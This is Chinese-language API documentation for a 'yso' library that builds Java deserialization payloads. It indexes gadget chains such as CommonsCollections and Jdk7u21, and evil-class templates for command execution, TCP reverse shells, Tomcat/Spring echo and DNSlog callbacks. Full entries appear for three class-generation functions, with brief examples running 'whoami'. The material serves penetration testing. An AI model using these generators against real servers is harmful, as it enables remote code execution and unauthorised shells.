# yso

|函数名|函数描述/介绍|
|:------|:--------|
| [yso.GenerateClass](#generateclass) |GenerateClass 根据提供的配置选项生成一个Java类对象。 这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。 对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应...|
| [yso.GenerateClassObjectFromBytes](#generateclassobjectfrombytes) |GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。 LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。 参数是Ge...|
| [yso.GenerateDNSlogEvilClassObject](#generatednslogevilclassobject) |GenDnslogClassObject GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象， 并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnsl...|
| [yso.GenerateHeaderEchoClassObject](#generateheaderechoclassobject) |GenHeaderEchoClassObject GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象， 参数: - options: 一组可选的 GenClassOptionFun 函数，用于...|
| [yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject](#generatemodifytomcatmaxheadersizeevilclassobject) |GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象， 这个函数结合使用 useModifyTomcatMaxHeaderSi...|
| [yso.GenerateMultiEchoClassObject](#generatemultiechoclassobject) |GenMultiEchoClassObject GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显， 参数: - options: 一组...|
| [yso.GenerateProcessBuilderExecEvilClassObject](#generateprocessbuilderexecevilclassobject) |GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象， 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecT...|
| [yso.GenerateProcessImplExecEvilClassObject](#generateprocessimplexecevilclassobject) |GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象， 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和S...|
| [yso.GenerateRuntimeExecEvilClassObject](#generateruntimeexecevilclassobject) |GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象， 并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecComman...|
| [yso.GenerateSleepClassObject](#generatesleepclassobject) |GenSleepClassObject GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象 参数: - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 返...|
| [yso.GenerateSpringEchoEvilClassObject](#generatespringechoevilclassobject) |GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象， 这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容...|
| [yso.GenerateTcpReverseEvilClassObject](#generatetcpreverseevilclassobject) |GenTcpReverseClassObject GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象， 这个函数结合使用 useTcpReverseTemplate ，tcpRever...|
| [yso.GenerateTcpReverseShellEvilClassObject](#generatetcpreverseshellevilclassobject) |GenTcpReverseShellClassObject GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象， 这个函数结合使用 useTcpReverseShe...|
| [yso.GenerateTomcatEchoClassObject](#generatetomcatechoclassobject) |GenTomcatEchoClassObject GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象， 参数: - options: 一组可选的 GenClassOptionFun 函...|
| [yso.GetAllGadget](#getallgadget) |GetAllGadget 获取所有支持的Java反序列化Gadget。 这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。 对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数； 对于不支持模板实现的Gadget，会创建一个接受命令...|
| [yso.GetAllRuntimeExecGadget](#getallruntimeexecgadget) |GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget 返回值: - 所有支持命令执行的 Gadget 生成函数切片|
| [yso.GetAllTemplatesGadget](#getalltemplatesgadget) |GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget 返回值: - 所有支持模板实现的 Gadget 生成函数切片|
| [yso.GetBeanShell1JavaObject](#getbeanshell1javaobject) |GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。 参数: - cmd: 要传入Java对象的命令字符串 返回值: ...|
| [yso.GetClick1JavaObject](#getclick1javaobject) |GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数允许用户定制生成的Java对象的特定属性或行为。 参数: - options...|
| [yso.GetCommonsBeanutils183NOCCJavaObject](#getcommonsbeanutils183noccjavaobject) |GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。 去除了对 commons-collections:3.1 的依赖。 通过可变参数`options`，用户可以提供额外的配置，这些配置使...|
| [yso.GetCommonsBeanutils192NOCCJavaObject](#getcommonsbeanutils192noccjavaobject) |GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。 去除了对 commons-collections:3.1 的依赖。 通过可变参数`options`，用户可以提供额外的配置，这些配置使...|
| [yso.GetCommonsBeanutils1JavaObject](#getcommonsbeanutils1javaobject) |GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Jav...|
| [yso.GetCommonsCollections1JavaObject](#getcommonscollections1javaobject) |GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值:...|
| [yso.GetCommonsCollections2JavaObject](#getcommonscollections2javaobject) |GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制...|
| [yso.GetCommonsCollections3JavaObject](#getcommonscollections3javaobject) |GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制...|
| [yso.GetCommonsCollections4JavaObject](#getcommonscollections4javaobject) |GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制...|
| [yso.GetCommonsCollections5JavaObject](#getcommonscollections5javaobject) |GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值: -...|
| [yso.GetCommonsCollections6JavaObject](#getcommonscollections6javaobject) |GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值: -...|
| [yso.GetCommonsCollections7JavaObject](#getcommonscollections7javaobject) |GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值: -...|
| [yso.GetCommonsCollections8JavaObject](#getcommonscollections8javaobject) |GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制...|
| [yso.GetCommonsCollectionsK1JavaObject](#getcommonscollectionsk1javaobject) |GetCommonsCollectionsK1JavaObject 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用...|
| [yso.GetCommonsCollectionsK2JavaObject](#getcommonscollectionsk2javaobject) |GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定...|
| [yso.GetCommonsCollectionsK3JavaObject](#getcommonscollectionsk3javaobject) |GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值:...|
| [yso.GetCommonsCollectionsK4JavaObject](#getcommonscollectionsk4javaobject) |GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值:...|
| [yso.GetFindGadgetByDNSJavaObject](#getfindgadgetbydnsjavaobject) |GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。 参数: - url: 要在生成的Java对象中设置...|
| [yso.GetGadget](#getgadget) |GenerateGadget this is a highly flexible function that can generate a Java object by three different ways: 1. Generate a Java object that have no any ...|
| [yso.GetGadgetNameByFun](#getgadgetnamebyfun) |GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。 函数名需要符合 &#34;Get*JavaObject&#34; 格式，返回中间的 * 部分作为 gadget 名称 参数: - i: gadget 生成函数的函数指针 返回值: - 解析出的 gadget 名称 - ...|
| [yso.GetGroovy1JavaObject](#getgroovy1javaobject) |GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。 参数: - cmd: 要设置在Java对象中的命令字符串 返回值: - 生成的 Java 对象 - 错误信息，失败时非 n...|
| [yso.GetJBossInterceptors1JavaObject](#getjbossinterceptors1javaobject) |GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Jav...|
| [yso.GetJSON1JavaObject](#getjson1javaobject) |GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Java对象的特定属性或行为。 参数: - options...|
| [yso.GetJavaObjectFromBytes](#getjavaobjectfrombytes) |GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。 此函数使用ParseJavaSerialized方法来解析提供的字节序列， 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空， 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对...|
| [yso.GetJavassistWeld1JavaObject](#getjavassistweld1javaobject) |GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Java对象的特定属性...|
| [yso.GetJdk7u21JavaObject](#getjdk7u21javaobject) |GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Java对象的特定属性或行为。 参数: - opt...|
| [yso.GetJdk8u20JavaObject](#getjdk8u20javaobject) |GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。 这些函数使用户能够定制生成的Java对象的特定属性或行为。 参数: - opt...|
| [yso.GetSimplePrincipalCollectionJavaObject](#getsimpleprincipalcollectionjavaobject) |GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。 使用一个空的 SimplePrincipa...|
| [yso.GetURLDNSJavaObject](#geturldnsjavaobject) |GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。 参数: - url: 要在生成的Java对象中...|
| [yso.LoadClassFromBCEL](#loadclassfrombcel) |LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组， 并从这些字节中加载并返回一个javaclassparser.ClassObject对象。 这个函数首先使用javaclassparser.Bcel2byt...|
| [yso.LoadClassFromBase64](#loadclassfrombase64) |LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。 这些参数是GenC...|
| [yso.LoadClassFromBytes](#loadclassfrombytes) |LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。 这些参数是GenClassOptio...|
| [yso.ToBcel](#tobcel) |ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串 参数: - i: Java 类对象(*javaclassparser.ClassObject) 返回值: - BCEL 编码格式的字符串 - 错误信息，失败时非 nil|
| [yso.ToBytes](#tobytes) |ToBytes 将 Java 或反序列化对象转换为字节码 参数: - i: Java 类对象或反序列化对象 - opts: 可选的序列化配置项，例如 dirtyDataLength、twoBytesCharString 等 返回值: - 序列化后的字节码 - 错误信息，失败时非 nil|
| [yso.ToJson](#tojson) |ToJson 将 Java 或反序列化对象转换为 json 字符串 参数: - i: Java 类对象或反序列化对象 返回值: - json 字符串 - 错误信息，失败时非 nil|
| [yso.command](#command) |SetExecCommand command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。 参数: - cmd: 要执行的命令字符串 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.dirtyDataLength](#dirtydatalength) |SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度 参数: - length: 要设置的脏数据长度 返回值: - 用于配置序列化的选项函数|
| [yso.dnslogDomain](#dnslogdomain) |SetDnslog dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。 参数: - addr: 要设置的 Dnslog 域名 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.dump](#dump) |dump 将Java 对象转换为类 Java 代码 参数: - i: Java 类对象或反序列化对象 返回值: - 类 Java 代码字符串 - 错误信息，失败时非 nil|
| [yso.evilClassName](#evilclassname) |SetClassName evilClassName 请求参数选项函数，用于设置生成的类名。 参数: - className: 要设置的类名 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.majorVersion](#majorversion) |SetMajorVersion majorVersion 请求参数选项函数，用于设置生成的 Java 类文件的 major 版本号(取值范围 45-62，超出范围回退为 52)。 参数: - v: Java 类文件的 major 版本号，取值范围 45-62 返回值: - 用于配置 Java 对象生...|
| [yso.obfuscationClassConstantPool](#obfuscationclassconstantpool) |SetObfuscation obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.springEchoBody](#springechobody) |SetEchoBody springEchoBody 请求参数选项函数，设置是否要在body中回显。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.springHeader](#springheader) |SetHeader springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。 需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，...|
| [yso.springParam](#springparam) |SetParam springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。 参数: - val: 要设置的回显值/请求参数 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.springRuntimeExecAction](#springruntimeexecaction) |SetExecAction springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.tcpReverseHost](#tcpreversehost) |SetTcpReverseHost tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。...|
| [yso.tcpReversePort](#tcpreverseport) |SetTcpReversePort tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。...|
| [yso.tcpReverseToken](#tcpreversetoken) |SetTcpReverseToken tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。 参数: - token: 要设置的 t...|
| [yso.threeBytesCharString](#threebytescharstring) |SetToBytesThreeBytesString 设置序列化时使用三字节字符串 返回值: - 用于配置序列化的选项函数|
| [yso.twoBytesCharString](#twobytescharstring) |SetToBytesTwoBytesString 设置序列化时使用双字节字符串 返回值: - 用于配置序列化的选项函数|
| [yso.useBase64BytesClass](#usebase64bytesclass) |SetClassBase64Bytes useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。 参数: - base64: base64 编码的字节码 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useBytesClass](#usebytesclass) |SetClassBytes useBytesClass 请求参数选项函数，传入字节码。 参数: - data: 字节码 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useBytesEvilClass](#usebytesevilclass) |SetBytesEvilClass useBytesEvilClass 请求参数选项函数，传入自定义的字节码。 参数: - data: 自定义的字节码 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useClassMultiEchoTemplate](#useclassmultiechotemplate) |SetClassMultiEchoTemplate useClassMultiEchoTemplate 请求参数选项函数，用于设置生成 MultiEcho 类的模板，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam ...|
| [yso.useClassParam](#useclassparam) |SetClassParam 设置类生成时的参数 参数: - k: 参数名 参数: - v: 参数值 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useConstructorExecutor](#useconstructorexecutor) |SetConstruct useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useDNSLogEvilClass](#usednslogevilclass) |SetDnslogEvilClass useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。 参数: - addr: 要设置的 Dnslog 域名 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useDNSlogTemplate](#usednslogtemplate) |SetClassDnslogTemplate useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useEchoBody](#useechobody) |SetEchoBody springEchoBody 请求参数选项函数，设置是否要在body中回显。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useHeaderEchoEvilClass](#useheaderechoevilclass) |SetHeaderEchoEvilClass useHeaderEchoEvilClass 请求参数选项函数，设置 HeaderEcho 类，需要配合 useHeaderParam 使用。 和 useHeaderEchoTemplate 的功能一样 返回值: - 用于配置 Java 对象生成的选项函...|
| [yso.useHeaderEchoTemplate](#useheaderechotemplate) |SetClassHeaderEchoTemplate useHeaderEchoTemplate 请求参数选项函数，用于设置生成HeaderEcho类的模板，需要配合 useHeaderParam 使用。 自动查找Response对象并在header中回显指定内容，需要注意的是，发送此函数时生成的 ...|
| [yso.useHeaderParam](#useheaderparam) |SetHeader springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。 需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，...|
| [yso.useModifyTomcatMaxHeaderSizeTemplate](#usemodifytomcatmaxheadersizetemplate) |SetClassModifyTomcatMaxHeaderSizeTemplate useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。 返回值: - 用于配置 Java 对象生成的选项函...|
| [yso.useMultiEchoEvilClass](#usemultiechoevilclass) |SetMultiEchoEvilClass useMultiEchoEvilClass 请求参数选项函数，设置 MultiEcho 类，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。 和 useClassM...|
| [yso.useParam](#useparam) |SetParam springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。 参数: - val: 要设置的回显值/请求参数 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useProcessBuilderExecEvilClass](#useprocessbuilderexecevilclass) |SetProcessBuilderExecEvilClass useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。 参数: - cmd: 要执行的命令字符串 返回值: - 用于配置 Java 对象...|
| [yso.useProcessBuilderExecTemplate](#useprocessbuilderexectemplate) |SetClassProcessBuilderExecTemplate useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useProcessImplExecEvilClass](#useprocessimplexecevilclass) |SetProcessImplExecEvilClass useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。 参数: - cmd: 要执行的命令字符串 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useProcessImplExecTemplate](#useprocessimplexectemplate) |SetClassProcessImplExecTemplate useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useRuntimeExecEvilClass](#useruntimeexecevilclass) |SetRuntimeExecEvilClass useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。 参数: - cmd: 要执行的命令字符串 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useRuntimeExecTemplate](#useruntimeexectemplate) |SetClassRuntimeExecTemplate useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useSleepEvilClass](#usesleepevilclass) |SetSleepEvilClass useSleepEvilClass 请求参数选项函数，设置 Sleep 类，需要配合 useSleepTime 使用。 和 useSleepTemplate 的功能一样 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useSleepTemplate](#usesleeptemplate) |SetClassSleepTemplate useSleepTemplate 请求参数选项函数，用于设置生成 Sleep 类的模板，需要配合 useSleepTime 使用，主要用与指定 sleep 时长，用于延时检测gadget。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useSleepTime](#usesleeptime) |SetSleepTime useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。 参数: - time: sleep 时长，单位秒 返回值: - 用于配置 Java 对象生...|
| [yso.useSpringEchoTemplate](#usespringechotemplate) |SetClassSpringEchoTemplate useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useTcpReverseEvilClass](#usetcpreverseevilclass) |SetTcpReverseEvilClass useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。 相当于 useTcpReverseTemplate ，tcpRevers...|
| [yso.useTcpReverseShellEvilClass](#usetcpreverseshellevilclass) |SetTcpReverseShellEvilClass useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。 相当于 useTcpR...|
| [yso.useTcpReverseShellTemplate](#usetcpreverseshelltemplate) |SetClassTcpReverseShellTemplate useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。 该参数与 ...|
| [yso.useTcpReverseTemplate](#usetcpreversetemplate) |SetClassTcpReverseTemplate useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。 还需要配合 tcpReverseToken 使用，用于是否反...|
| [yso.useTemplate](#usetemplate) |SetClassType 设置要生成的类类型 参数: - t: 类类型 返回值: - 用于配置 Java 对象生成的选项函数|
| [yso.useTomcatEchoEvilClass](#usetomcatechoevilclass) |SetTomcatEchoEvilClass useTomcatEchoEvilClass 请求参数选项函数，设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。 和 useTomcatEchoTemplate 的功能一样 返回...|
| [yso.useTomcatEchoTemplate](#usetomcatechotemplate) |SetClassTomcatEchoTemplate useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。 返回值: - 用于配置 Java 对象生成的选项...|


## 函数定义
### GenerateClass

#### 详细描述
GenerateClass 根据提供的配置选项生成一个Java类对象。

这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。

对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应用参数。

参数:

  - options: 一组 GenClassOptionFun 函数，用于配置生成的类对象的各种属性



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
// 使用原始字节码生成类对象
classObj, err := yso.GenerateClass(yso.SetClassBytes(bytecode))

// 使用预定义模板生成类对象
classObj, err := yso.GenerateClass(yso.SetClassType(ClassRuntimeExec), yso.SetExecCommand("whoami"))
``````````````


#### 定义

`GenerateClass(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` | 一组 GenClassOptionFun 函数，用于配置生成的类对象的各种属性 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateClassObjectFromBytes

#### 详细描述
GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。

LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。

参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

参数:

  - bytes: 要从中加载类对象的字节数组



参数:

  - options: 用于配置类对象的可变参数函数列表



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
``````````````


#### 定义

`GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| bytes | `[]byte` | 要从中加载类对象的字节数组 |
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


### GenerateDNSlogEvilClassObject

#### 详细描述
GenDnslogClassObject

GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，

并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，

以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。

参数:

  - domain: 要在生成的Java对象中请求的 Dnslog 域名



参数:

  - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象



返回值:

  - 生成的 javaclassparser.ClassObject 对象

  - 错误信息，失败时非 nil




Example:

``````````````yak
domain := "dnslog.com" // 假设的 Dnslog 域名
classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
``````````````


#### 定义

`GenerateDNSlogEvilClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| domain | `string` | 要在生成的Java对象中请求的 Dnslog 域名 |
| options | `...GenClassOptionFun` | 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |


